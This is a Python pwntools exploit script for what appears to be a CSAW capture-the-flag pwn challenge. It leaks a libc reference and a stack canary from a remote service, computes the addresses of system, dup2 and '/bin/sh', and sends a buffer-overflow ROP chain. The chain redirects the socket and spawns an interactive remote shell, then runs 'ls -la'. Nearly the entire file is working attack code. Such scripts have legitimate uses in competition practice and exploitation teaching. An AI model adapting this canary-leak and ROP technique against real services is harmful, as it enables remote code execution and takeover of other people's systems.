#!/usr/bin/python

import sys
from pwn import *
with open('payload', 'w') as f:
	f.write('')

def send(conn, line):
	print line
	conn.sendline(line)

	with open('payload', 'a') as f:
		line += '\x0a' # fuck you :)
		f.write(line)

# print the menu
conn = remote("pwn.chal.csaw.io",8002)
# conn = remote("localhost", int(sys.argv[1]))
print conn.recvuntil(">")

# leak the reference
send(conn, "1")
print conn.recvuntil("Reference:")
ref = conn.recvuntil("\n")
print ref

# leak the stack cookie
print conn.recvuntil(">")
send(conn, "2")
send(conn, "A"*(312-4)+":::")
print conn.recvuntil(":::")
cookie = conn.recvuntil("-Tutorial-")[:-len("-Tutorial-")].lstrip()[:-4]

# get back to the menu
print conn.recvuntil(">")

# the referecne is puts - 1280
puts_libc = int(ref,16)+1280
puts = p64(puts_libc)



# I got the libc and found the 
# addresses of the things:
# puts 000000000006fd60
# system 0000000000046590
# dup2 00000000000ebe90
# binsh 017c8c3

sysMputs = 0x46590 - 0x6fd60
dupMputs = 0xebe90 - 0x6fd60
binMputs = 0x17c8c3 - 0x6fd60

# locally
# puts 06b990
# system 41490
# dup2 0dc490
# binsh 1639a0

# sysMputs = 0x41490 - 0x06b990
# dupMputs = 0x0dc490 - 0x06b990
# binMputs = 0x1639a0 - 0x06b990

system = p64(puts_libc + sysMputs)
dup2 = p64(puts_libc + dupMputs)
addr_binsh = p64(puts_libc + binMputs)



ebp = p64(0x00007fffffffe250)


# # null
# null = p64(0x400007)

# 0x004012e1 : (5e415fc3)	pop rsi; pop r15; ret
# 0x00400d49 : (01f3c3)	add ebx,esi; ret
rop_pop_rsi_pop = p64(0x004012e1)
rop_add_ebx_esi = p64(0x00400d49)
#0x4012dc: pop r12; pop r13; pop r14; pop r15; ret
#0x4012e3: pop rdi; ret
pop_rdi = p64(0x4012e3)
pops = p64(0x4012dc)
print ref

# rdi rsi 

# rdi is already the fd for socket :) yay
send(conn, "2")
payload = "A"*(312-4)+"::::" + cookie + ebp
# dup2(fd, stdin)
payload += rop_pop_rsi_pop + p64(0) + "A"*8 + dup2
payload += rop_pop_rsi_pop + p64(1) + "A"*8 + dup2
payload += rop_pop_rsi_pop + p64(2) + "A"*8 + dup2
payload += pop_rdi + addr_binsh +  system
send(conn,  payload)
send(conn,  "ls -la")


conn.interactive()


